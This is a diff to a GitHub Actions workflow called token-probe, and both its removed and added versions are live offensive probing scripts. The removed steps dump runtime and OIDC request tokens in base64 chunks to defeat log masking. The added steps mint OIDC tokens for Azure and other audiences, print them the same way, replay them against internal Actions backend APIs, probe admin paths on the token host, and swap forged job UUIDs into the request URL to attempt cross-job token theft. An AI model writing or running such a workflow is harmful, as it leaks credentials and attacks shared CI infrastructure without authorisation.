@@ -1,8 +1,6 @@
-name: token-probe
+name: token-probe-v2
 on:
   workflow_dispatch:
-  push:
-    branches: [token-probe]
 jobs:
   probe:
     runs-on: ubuntu-latest
@@ -10,54 +8,54 @@ jobs:
       id-token: write
       contents: read
     steps:
-      - name: extract and use runtime token
+      - name: extract OIDC + probe
         run: |
-          set -x
-          echo "=== ACTIONS_RUNTIME_URL=$ACTIONS_RUNTIME_URL ==="
-          echo "=== ACTIONS_RUNTIME_TOKEN length=$([ -n \"$ACTIONS_RUNTIME_TOKEN\" ] && echo ${#ACTIONS_RUNTIME_TOKEN} || echo 0) ==="
-          # Bypass masking: split + b64 encode
-          if [ -n "$ACTIONS_RUNTIME_TOKEN" ]; then
-            for i in 1 2 3 4; do
-              CHUNK=$(echo "$ACTIONS_RUNTIME_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
-              echo "TOKEN_CHUNK_$i=$CHUNK"
-            done
-          fi
-          # Also dump ACTIONS_ID_TOKEN_REQUEST_URL and TOKEN
-          echo "=== ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL ==="
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
-            for i in 1 2 3 4; do
-              CHUNK=$(echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
-              echo "IDTOKEN_REQ_CHUNK_$i=$CHUNK"
-            done
-          fi
-          # Get an ID token from OIDC
-          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-            ID_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=pipelinesghub" | python3 -c "import sys,json; print(json.load(sys.stdin).get(\"value\",\"\"))" 2>/dev/null)
-            echo "ID_TOKEN length=${#ID_TOKEN}"
-            for i in 1 2 3 4; do
-              CHUNK=$(echo "$ID_TOKEN" | head -c $((i*200)) | tail -c 200 | base64 -w0)
-              echo "ID_TOKEN_CHUNK_$i=$CHUNK"
-            done
-          fi
-          # Try the runtime token against pipelinesghub directly
-          for AUTH_HDR in \
-            "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
-            "Authorization: VstsOAuth $ACTIONS_RUNTIME_TOKEN"; do
-            echo "--- Trying $(echo $AUTH_HDR | cut -d: -f1) ---"
-            curl -sS -m 10 -H "$AUTH_HDR" -o /tmp/r.txt -w "HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/distributedtask/pools?api-version=6.0-preview"
-            head -c 500 /tmp/r.txt
-            echo ""
-          done
-          # Probe operations endpoint with runtime token
-          curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "operations HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/operations/7f82df6d-7d09-46c1-a015-643b556b3a1e?api-version=6.0-preview"
-          head -c 500 /tmp/r.txt
+          set +x
+          echo "=== Discovering env ==="
+          env | grep -E "^(ACTIONS|GITHUB|RUNNER)_" | grep -v TOKEN | head -20
           echo ""
-          # Use the runtime URL — it points to a specific backend
-          if [ -n "$ACTIONS_RUNTIME_URL" ]; then
-            curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "RT URL HTTP=%{http_code} LEN=%{size_download}\n" "${ACTIONS_RUNTIME_URL%/}/_apis/distributedtask/pools?api-version=6.0-preview"
-            head -c 500 /tmp/r.txt
-            echo ""
-            curl -sS -m 10 -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" -o /tmp/r.txt -w "RT URL connectionData HTTP=%{http_code} LEN=%{size_download}\n" "${ACTIONS_RUNTIME_URL%/}/_apis/connectionData?connectOptions=IncludeServices,IncludeLastUserAccess"
-            head -c 500 /tmp/r.txt
-          fi
+          
+          # Request OIDC tokens for different audiences
+          for AUD in "pipelinesghub" "vso:9ae871ac-7911-43de-921f-d33dbea51323" "api://AzureADTokenExchange" "https://management.azure.com" "63be6134-28d1-8c82-e969-91f4e88fcdec"; do
+            ID_TOKEN=$(curl -sS -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",d.get(\"message\",\"\")))" 2>/dev/null)
+            echo "=== AUD=$AUD len=${#ID_TOKEN} ==="
+            # Echo via printenv-bypass: write to file, base64 in many chunks
+            echo "$ID_TOKEN" > /tmp/tk
+            LEN=${#ID_TOKEN}
+            CHUNKS=$(( (LEN+199)/200 ))
+            for i in $(seq 1 $CHUNKS); do
+              S=$(( (i-1)*200 ))
+              # use python to slice and base64
+              CHUNK=$(python3 -c "import base64; t=open(\"/tmp/tk\").read().strip(); print(base64.b64encode(t[${S}:${S}+200].encode()).decode())")
+              echo "TOK_${AUD//[^a-zA-Z0-9]/_}_${i}=$CHUNK"
+            done
+            # Try this token against pipelinesghub
+            curl -sS -m 8 -H "Authorization: Bearer $ID_TOKEN" -o /tmp/r.txt -w "  $AUD /_apis/operations HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/operations/7f82df6d-7d09-46c1-a015-643b556b3a1e?api-version=6.0-preview"
+            head -c 200 /tmp/r.txt && echo ""
+            curl -sS -m 8 -H "Authorization: Bearer $ID_TOKEN" -o /tmp/r.txt -w "  $AUD /_apis/distributedtask/pools HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/distributedtask/pools?api-version=6.0-preview"
+            head -c 200 /tmp/r.txt && echo ""
+            curl -sS -m 8 -H "Authorization: Bearer $ID_TOKEN" -o /tmp/r.txt -w "  $AUD /_apis/connectionData HTTP=%{http_code} LEN=%{size_download}\n" "https://pipelinesghubeus5.actions.githubusercontent.com/_apis/connectionData?connectOptions=IncludeServices,IncludeLastUserAccess"
+            head -c 200 /tmp/r.txt && echo ""
+          done
+          
+          # Probe run-actions-1-azure-eastus directly
+          echo "=== run-actions backend ==="
+          HOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | python3 -c "import sys,urllib.parse; print(urllib.parse.urlparse(sys.stdin.read()).netloc)")
+          echo "Host: $HOST"
+          for P in / /_apis /_apis/connectionData /v1 /api /api/v1 /103 /104 /103/idtoken /103/health /admin; do
+            curl -sS -m 5 -o /tmp/r.txt -w "$P HTTP=%{http_code} LEN=%{size_download}\n" "https://$HOST$P"
+            if [ "$(stat -c%s /tmp/r.txt)" -gt 0 ] && [ "$(stat -c%s /tmp/r.txt)" -lt 500 ]; then
+              echo "  body: $(head -c 200 /tmp/r.txt)"
+            fi
+          done
+          
+          # Cross-job ID token request — try OTHER job/run UUIDs in the URL
+          echo "=== Cross-job ID token request ==="
+          ORIG_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
+          for FAKE_JOB in "00000000-0000-0000-0000-000000000000" "ffffffff-ffff-ffff-ffff-ffffffffffff" "12345678-1234-1234-1234-123456789012"; do
+            # Replace the last UUID in path with fake one
+            MUT_URL=$(echo "$ORIG_URL" | sed -E "s|[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\?|$FAKE_JOB?|" )
+            curl -sS -m 5 -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" -o /tmp/r.txt -w "FAKE=$FAKE_JOB HTTP=%{http_code} LEN=%{size_download}\n" "${MUT_URL}&audience=test"
+            head -c 200 /tmp/r.txt && echo ""
+          done
 
